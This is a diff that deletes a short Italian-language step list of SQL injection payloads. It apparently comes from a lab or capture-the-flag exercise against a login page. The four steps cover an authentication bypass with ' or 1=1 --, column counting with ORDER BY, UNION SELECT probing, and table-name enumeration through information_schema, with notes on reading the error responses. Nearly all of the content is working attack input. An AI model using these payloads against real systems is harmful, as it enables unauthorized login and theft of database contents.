@@ -1,6 +1,0 @@
-1) ' or 1=1 -- 
-2) ' ORDER BY N --     (finché non ottieni l'errore giusto. A quel punto il numero di colonne dovrebbe essere proprio N-1)
-3) ' UNION SELECT 1,2,...,N-1 --  (In base alla risposta sarai in grado di capire quali colonne della tabella di accesso sono "visibili a schermo", e quindi da quali di queste è possibile iniettare valori personalizzati ed estrarre dati; altrimenti ottieni il seguente errore: "Errore nella query: The used SELECT statements have a different number of columns")
-4) ' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0 -- (Questa query ti permetterà di ottenere il nome della tabella di accesso.Per controllare la presenza di altre tabelle sarà necessario solo aumentare il numero relativo all'OFFSET; quando negherà l'accesso, vorrà dire che il numero di colonne sarà uguale a OFFSET-1)
-
-
